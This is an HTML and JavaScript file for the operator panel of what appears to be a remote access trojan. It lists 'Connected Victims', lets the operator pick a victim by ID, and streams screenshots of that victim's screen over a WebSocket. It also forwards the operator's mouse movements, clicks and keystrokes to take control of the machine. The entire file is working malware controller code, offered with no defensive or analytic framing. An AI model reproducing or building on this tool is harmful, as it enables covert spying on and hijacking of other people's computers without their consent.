<!DOCTYPE html>
<html>
<head>
  <title>Remote Viewer</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; background: #000; overflow: hidden; cursor: default; }

    #container {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #000;
    }

    #connectPanel {
      position: absolute;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      z-index: 100;
      text-align: center;
    }
    #connectPanel.hidden { display: none; }
    #connectPanel input {
      background: #1a1a1a;
      border: 1px solid #333;
      padding: 12px 20px;
      font: 16px monospace;
      color: #0f0;
      border-radius: 6px;
      width: 300px;
      outline: none;
      text-align: center;
    }
    #connectPanel input:focus { border-color: #0f0; }
    #connectPanel button {
      background: #0a0;
      color: #000;
      border: none;
      padding: 12px 30px;
      font: 16px sans-serif;
      font-weight: bold;
      border-radius: 6px;
      margin-top: 12px;
      cursor: pointer;
    }
    #connectPanel button:hover { background: #0c0; }
    #connectPanel .hint { color: #666; font: 13px sans-serif; margin-top: 10px; }

    #wrapper {
      position: relative;
      background: #000;
      overflow: hidden;
      display: none;
    }
    #wrapper.active { display: block; }
    #wrapper.locked { cursor: none; }

    #screenCanvas {
      display: block;
      width: 100%;
      height: 100%;
      background: #111;
    }

    #overlay {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      pointer-events: none;
      z-index: 10;
    }
    #overlay.hidden { display: none; }
    #overlay span {
      color: #fff;
      font: 20px sans-serif;
      background: rgba(0,0,0,0.7);
      padding: 20px 40px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.3);
      text-align: center;
      line-height: 1.5;
    }
    #overlay .hint { color: #0f0; font-size: 14px; }

    #info {
      position: fixed;
      bottom: 6px; right: 6px;
      font-size: 11px;
      color: #888;
      background: rgba(0,0,0,0.6);
      padding: 2px 8px;
      border-radius: 3px;
      pointer-events: none;
      z-index: 999;
    }
    #info.on { color: #4c4; }
    #info.off { color: #c44; }
    #info.wait { color: #cc4; }

    #victimList {
      position: fixed;
      top: 10px; right: 10px;
      z-index: 50;
      background: rgba(0,0,0,0.85);
      border: 1px solid #333;
      border-radius: 6px;
      padding: 10px;
      min-width: 220px;
      max-height: 300px;
      overflow-y: auto;
    }
    #victimList.hidden { display: none; }
    #victimList .title {
      color: #888;
      font: 12px sans-serif;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .victim-entry {
      color: #aaa;
      font: 13px monospace;
      padding: 4px 8px;
      cursor: pointer;
      border-radius: 3px;
      transition: background 0.15s;
    }
    .victim-entry:hover { background: #222; color: #0f0; }
    .victim-entry.selected { background: #0a0; color: #000; font-weight: bold; }
    .victim-entry .status-dot {
      display: inline-block;
      width: 8px; height: 8px;
      border-radius: 50%;
      margin-right: 6px;
      background: #4c4;
    }
  </style>
</head>
<body>
  <div id="container">
    <div id="connectPanel">
      <input id="victimIdInput" type="text" placeholder="Enter Victim ID..." autocomplete="off" spellcheck="false"/>
      <br/>
      <button id="connectBtn">Connect</button>
      <div class="hint">or click a victim from the list</div>
    </div>

    <div id="wrapper">
      <canvas id="screenCanvas"></canvas>
      <div id="overlay"><span>Click here to lock mouse<br><small class="hint">ESC to unlock</small></span></div>
    </div>

    <div id="victimList" class="hidden">
      <div class="title">Connected Victims</div>
    </div>
  </div>
  <div id="info">Disconnected</div>

  <script>
    (function() {
      const loc = window.location;
      const wsUrl = (loc.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + loc.host;

      let socket = null;
      let selectedVictimId = null;
      let currentVictimId = null;
      let locked = false;
      let capW = 1920;
      let capH = 1080;
      let ratioX = 1;
      let ratioY = 1;
      let accDx = 0;
      let accDy = 0;
      let sendTimer = null;

      // Canvas
      const canvas = document.getElementById('screenCanvas');
      const ctx = canvas.getContext('2d', { alpha: false });
      let latestFrame = null;     // Uint8Array (JPEG bytes only, no header)
      let frameReady = false;

      const wrapper = document.getElementById('wrapper');
      const overlay = document.getElementById('overlay');
      const info = document.getElementById('info');
      const connectPanel = document.getElementById('connectPanel');
      const victimIdInput = document.getElementById('victimIdInput');
      const connectBtn = document.getElementById('connectBtn');
      const victimList = document.getElementById('victimList');

      // ─── SIZING ───
      function sizeWrapper() {
        const vw = window.innerWidth;
        const vh = window.innerHeight;
        const scale = Math.min(vw / capW, vh / capH);
        wrapper.style.width = (capW * scale) + 'px';
        wrapper.style.height = (capH * scale) + 'px';
        canvas.width = capW;
        canvas.height = capH;
        canvas.style.width = (capW * scale) + 'px';
        canvas.style.height = (capH * scale) + 'px';
        ratioX = capW / (capW * scale);
        ratioY = capH / (capH * scale);
      }
      window.addEventListener('resize', sizeWrapper);

      // ─── RENDER LOOP (decodes JPEG and draws to canvas) ───
      function renderFrame() {
        if (!latestFrame || !frameReady) {
          requestAnimationFrame(renderFrame);
          return;
        }

        // Only render the latest — clear the flag so we don't re-render same frame
        frameReady = false;
        const data = latestFrame;
        
        try {
          const blob = new Blob([data], { type: 'image/jpeg' });
          const url = URL.createObjectURL(blob);
          const img = new Image();
          img.onload = function() {
            ctx.drawImage(img, 0, 0);
            URL.revokeObjectURL(url);
          };
          img.onerror = function() {
            URL.revokeObjectURL(url);
          };
          img.src = url;
        } catch(e) {
          // silently fail
        }

        requestAnimationFrame(renderFrame);
      }

      // ─── POINTER LOCK ───
      wrapper.addEventListener('click', function() {
        if (!locked && currentVictimId) {
          wrapper.requestPointerLock({ unadjustedMovement: true });
        }
      });

      document.addEventListener('pointerlockchange', function() {
        locked = document.pointerLockElement === wrapper;
        wrapper.classList.toggle('locked', locked);
        overlay.classList.toggle('hidden', locked);
        if (currentVictimId) {
          info.textContent = capW + 'x' + capH + (locked ? ' Locked' : ' Click to lock');
        }
      });

      document.addEventListener('pointerlockerror', function() {
        info.textContent = capW + 'x' + capH + ' Lock failed';
      });

      // ─── MOUSE ───
      document.addEventListener('mousemove', function(e) {
        if (!locked || !currentVictimId) return;
        accDx += (e.movementX || 0);
        accDy += (e.movementY || 0);
      });

      sendTimer = setInterval(function() {
        if (!locked || !currentVictimId || (accDx === 0 && accDy === 0)) return;
        if (socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ type: 'mousedelta', dx: accDx * ratioX, dy: accDy * ratioY }));
        }
        accDx = 0; accDy = 0;
      }, 50);

      wrapper.addEventListener('click', function(e) {
        if (locked && currentVictimId && socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ type: 'click', btn: 'left' }));
        }
      });

      wrapper.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        if (locked && currentVictimId && socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ type: 'click', btn: 'right' }));
        }
      });

      // ─── KEYBOARD ───
      document.addEventListener('keydown', function(e) {
        const prevent = ['Space','ArrowUp','ArrowDown','ArrowLeft','ArrowRight','Tab'];
        if (prevent.includes(e.code) || e.key === ' ') e.preventDefault();
        if (e.key === 'F5' || e.key === 'F12' ||
            (e.ctrlKey && 'rRwWtTnN'.includes(e.key)) ||
            (e.metaKey && 'rRwWtTnN'.includes(e.key))) return;
        if (!currentVictimId) return;
        if (e.key === 'Escape' && locked) { document.exitPointerLock(); return; }
        if (socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ type: 'keydown', key: e.key }));
        }
      });

      document.addEventListener('keyup', function() {
        if (currentVictimId && socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ type: 'keyup', key: '' }));
        }
      });

      // ─── VICTIM LIST UI ───
      window.__victims = {};

      function renderVictimList() {
        const entries = Object.entries(window.__victims);
        if (entries.length === 0) { victimList.classList.add('hidden'); return; }
        victimList.classList.remove('hidden');
        let html = '<div class="title">Connected Victims</div>';
        for (const [id, v] of entries) {
          const selected = id === selectedVictimId;
          html += '<div class="victim-entry' + (selected ? ' selected' : '') + '" data-id="' + id + '">' +
            '<span class="status-dot"></span>' + id +
            (v.screen ? ' <span style="color:#666;font-size:11px">' + v.screen + '</span>' : '') +
            '</div>';
        }
        victimList.innerHTML = html;
        victimList.querySelectorAll('.victim-entry').forEach(el => {
          el.addEventListener('click', function() {
            const id = this.dataset.id;
            if (id) connectToVictim(id);
          });
        });
      }

      function updateVictimList(victims) {
        window.__victims = {};
        for (const v of victims) {
          window.__victims[v.id] = { screen: v.screenWidth + 'x' + v.screenHeight };
        }
        renderVictimList();
      }

      // ─── CONNECT TO VICTIM ───
      function connectToVictim(id) {
        if (!id || currentVictimId === id) return;
        selectedVictimId = id;
        currentVictimId = id;
        info.textContent = 'Connecting to ' + id + '...';
        info.className = 'wait';
        connectPanel.classList.add('hidden');
        if (socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ type: 'register_viewer', victimId: id }));
        }
        renderVictimList();
      }

      // ─── WEBSOCKET ───
      function connectSocket() {
        socket = new WebSocket(wsUrl);
        socket.binaryType = 'arraybuffer';

        socket.onopen = function() {
          info.textContent = 'Connected. Select a victim.';
          info.className = 'on';
          if (selectedVictimId) {
            socket.send(JSON.stringify({ type: 'register_viewer', victimId: selectedVictimId }));
          }
        };

        socket.onmessage = function(evt) {
          // BINARY FRAME (screenshot)
          if (evt.data instanceof ArrayBuffer) {
            const buf = new Uint8Array(evt.data);
            if (buf.length < 8) return;

            // Skip cursor position (first 8 bytes) — we draw it on the victim side already
            // Just store the JPEG bytes for rendering
            latestFrame = buf.slice(8);
            frameReady = true;
            return;
          }

          // TEXT FRAMES
          let msg;
          try { msg = JSON.parse(evt.data); } catch (e) { return; }

          switch (msg.type) {
            case 'victim_list':
              updateVictimList(msg.victims || []);
              break;

            case 'victim_ready':
              capW = msg.screenWidth || 1920;
              capH = msg.screenHeight || 1080;
              currentVictimId = msg.victimId;
              sizeWrapper();
              wrapper.classList.add('active');
              info.textContent = capW + 'x' + capH + ' Click to lock';
              info.className = 'on';
              break;

            case 'waiting':
              info.textContent = 'Waiting for victim: ' + msg.victimId + '...';
              info.className = 'wait';
              break;

            case 'victim_disconnected':
              if (msg.victimId === currentVictimId) {
                currentVictimId = null;
                wrapper.classList.remove('active');
                connectPanel.classList.remove('hidden');
                if (locked) document.exitPointerLock();
                info.textContent = 'Victim disconnected';
                info.className = 'off';
                latestFrame = null;
                frameReady = false;
                ctx.clearRect(0, 0, canvas.width, canvas.height);
              }
              break;
          }
        };

        socket.onclose = function() {
          info.textContent = 'Disconnected. Reconnecting...';
          info.className = 'off';
          if (locked) document.exitPointerLock();
          setTimeout(connectSocket, 2000);
        };

        socket.onerror = function() {
          info.textContent = 'Connection error';
          info.className = 'off';
        };
      }

      // ─── UI BINDINGS ───
      victimIdInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') connectToVictim(victimIdInput.value.trim());
      });
      connectBtn.addEventListener('click', function() {
        connectToVictim(victimIdInput.value.trim());
      });

      // ─── INIT ───
      connectSocket();
      requestAnimationFrame(renderFrame);
    })();
  </script>
</body>
</html>
